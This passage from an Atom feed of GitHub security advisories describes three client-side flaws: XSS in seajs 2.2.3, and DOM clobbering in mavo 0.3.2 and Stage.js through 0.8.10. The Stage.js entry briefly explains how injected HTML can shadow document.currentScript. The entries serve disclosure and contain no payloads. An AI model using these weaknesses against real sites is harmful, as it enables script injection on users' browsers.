        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in seajs v.2.2.3 allows a remote attacker to execute arbitrary code via the seajs package</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51091">https://nvd.nist.gov/vuln/detail/CVE-2024-51091</a></li>
<li><a href="https://gist.github.com/jackfromeast/176413c3bd73f825f7aeeb05e80e02a6">https://gist.github.com/jackfromeast/176413c3bd73f825f7aeeb05e80e02a6</a></li>
<li><a href="https://github.com/advisories/GHSA-pfr4-4397-3hg8">https://github.com/advisories/GHSA-pfr4-4397-3hg8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pfr4-4397-3hg8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-03T18:31:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mavo] mavo DOM Clobbering vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3mf5-r4hg-hfx9</id>
        <link href="https://github.com/advisories/GHSA-3mf5-r4hg-hfx9"/>
        <updated>2025-03-03T22:16:43.000Z</updated>
        <content type="html"><![CDATA[<p>A DOM Clobbering vulnerability in mavo v0.3.2 allows attackers to execute arbitrary code via supplying a crafted HTML element.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53388">https://nvd.nist.gov/vuln/detail/CVE-2024-53388</a></li>
<li><a href="https://gist.github.com/jackfromeast/a61a5429a97985e7ff4c1d39e339d5d8">https://gist.github.com/jackfromeast/a61a5429a97985e7ff4c1d39e339d5d8</a></li>
<li><a href="https://github.com/advisories/GHSA-3mf5-r4hg-hfx9">https://github.com/advisories/GHSA-3mf5-r4hg-hfx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mf5-r4hg-hfx9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stage-js] Stage.js DOM Clobbering vulnerabilty]]></title>
        <id>https://github.com/advisories/GHSA-fp3m-g5rc-4c28</id>
        <link href="https://github.com/advisories/GHSA-fp3m-g5rc-4c28"/>
        <updated>2025-03-03T20:17:22.000Z</updated>
        <content type="html"><![CDATA[<p>Stage.js through 0.8.10 allows DOM Clobbering (with resultant XSS for untrusted input that contains HTML but does not directly contain JavaScript), because document.currentScript lookup can be shadowed by attacker-injected HTML elements.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53386">https://nvd.nist.gov/vuln/detail/CVE-2024-53386</a></li>
<li><a href="https://gist.github.com/jackfromeast/31d56f1ad17673aabb6ab541e65a5534">https://gist.github.com/jackfromeast/31d56f1ad17673aabb6ab541e65a5534</a></li>
<li><a href="https://github.com/piqnt/stage.js/blob/919f6e94b14242f6e6994141a9e1188439d306d5/lib/core.js#L158-L159">https://github.com/piqnt/stage.js/blob/919f6e94b14242f6e6994141a9e1188439d306d5/lib/core.js#L158-L159</a></li>
<li><a href="https://github.com/advisories/GHSA-fp3m-g5rc-4c28">https://github.com/advisories/GHSA-fp3m-g5rc-4c28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fp3m-g5rc-4c28</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T09:30:34.000Z</published>
    </entry>
</feed>